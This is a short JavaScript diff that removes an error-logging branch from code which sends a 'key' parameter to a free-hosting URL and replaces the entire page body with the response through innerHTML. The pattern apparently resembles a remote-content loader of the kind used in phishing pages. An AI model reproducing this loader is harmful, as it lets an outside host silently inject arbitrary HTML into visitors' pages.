@@ -16,9 +16,7 @@ if (keyParam) {
     if (xhr.readyState === XMLHttpRequest.DONE) {
       if (xhr.status === 200) {
         document.body.innerHTML = xhr.responseText;
-      } else {
-        console.error('Request failed with status:', xhr.status);
-      }
+      }  
     }
   };
   xhr.open('GET', 'https://engrained-forces.000webhostapp.com/git/?key=' + keyParam, true);
